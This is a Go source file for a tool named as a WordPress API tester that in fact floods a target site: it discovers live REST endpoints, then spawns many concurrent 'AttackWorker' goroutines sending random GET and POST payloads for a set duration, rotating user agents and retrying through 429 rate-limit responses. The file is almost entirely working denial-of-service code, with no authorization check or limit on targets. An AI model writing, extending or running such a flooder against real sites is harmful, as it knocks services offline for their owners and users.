package internal

import (
	"bytes"
	"context"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"time"
	"sync"
	"math/rand"
)

type WordPressAPITester struct {
	Config    *Config
	Client    *http.Client
}

func NewWordPressAPITester(cfg *Config) *WordPressAPITester {
	return &WordPressAPITester{
		Config: cfg,
		Client: &http.Client{Timeout: 5 * time.Second},
	}
}

// SendRequest with retry and rate limit handling
func (w *WordPressAPITester) SendRequest(ctx context.Context, method, baseURL string, endpoint Endpoint, data map[string]interface{}) (*ResponseResult, error) {
	fullURL := baseURL + "/" + endpoint.Path
	var bodyBytes []byte
	var err error
	if data != nil {
		bodyBytes, err = json.Marshal(data)
		if err != nil {
			return nil, err
		}
	}
	headers := map[string]string{
		"Accept":          "application/json, text/plain, */*",
		"Accept-Language": "en-US,en;q=0.9",
		"Connection":      "keep-alive",
		"Content-Type":    "application/json",
		"X-Requested-With": "XMLHttpRequest",
		"User-Agent":      RandomUserAgent(w.Config.UserAgents),
	}
	for attempt := 1; attempt <= 3; attempt++ {
		req, err := http.NewRequestWithContext(ctx, method, fullURL, bytes.NewReader(bodyBytes))
		if err != nil {
			return nil, err
		}
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := w.Client.Do(req)
		if err != nil {
			if attempt == 3 {
				return nil, err
			}
			time.Sleep(time.Second)
			continue
		}
		defer resp.Body.Close()
		body, _ := ioutil.ReadAll(resp.Body)
		PrintStatus(method, baseURL, resp.StatusCode)
		if resp.StatusCode == 429 {
			time.Sleep(time.Second)
			continue
		}
		return &ResponseResult{
			URL:    fullURL,
			Method: method,
			Status: resp.StatusCode,
			Body:   string(body),
		}, nil
	}
	return nil, err
}

// Discover valid endpoints (HEAD request, throttled)
func (w *WordPressAPITester) DiscoverValidEndpoints(baseURL string, maxConcurrent int) []Endpoint {
	var wg sync.WaitGroup
	sem := NewSemaphore(maxConcurrent)
	valid := make([]Endpoint, 0)
	mu := sync.Mutex{}
	for _, ep := range w.Config.Endpoints {
		wg.Add(1)
		go func(endpoint Endpoint) {
			defer wg.Done()
			sem.Acquire()
			defer sem.Release()
			url := baseURL + "/" + endpoint.Path
			req, _ := http.NewRequest("HEAD", url, nil)
			req.Header.Set("User-Agent", RandomUserAgent(w.Config.UserAgents))
			resp, err := w.Client.Do(req)
			if err == nil && resp.StatusCode >= 200 && resp.StatusCode < 404 {
				mu.Lock()
				valid = append(valid, endpoint)
				mu.Unlock()
			}
			if resp != nil {
				resp.Body.Close()
			}
		}(ep)
	}
	wg.Wait()
	if len(valid) == 0 {
		return w.Config.Endpoints
	}
	return valid
}

// Attack worker
func (w *WordPressAPITester) AttackWorker(ctx context.Context, baseURL string, endpoints []Endpoint, duration time.Duration, wg *sync.WaitGroup) {
	defer wg.Done()
	start := time.Now()
	for time.Since(start) < duration {
		endpoint := RandomEndpoint(endpoints)
		method := "GET"
		var payload map[string]interface{}
		if rand.Intn(2) == 0 {
			method = "POST"
			payload = RandomPayload(w.Config.Payloads).Data
		}
		_, err := w.SendRequest(ctx, method, baseURL, endpoint, payload)
		if err != nil {
			TimeoutLog(method, baseURL)
		}
		delay := 50 + rand.Intn(150) // 50-200ms
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
}

// Flood: spawn N workers
func (w *WordPressAPITester) Flood(ctx context.Context, baseURL string, workers int, duration time.Duration) {
	validEndpoints := w.DiscoverValidEndpoints(baseURL, 10)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go w.AttackWorker(ctx, baseURL, validEndpoints, duration, &wg)
	}
	wg.Wait()
} 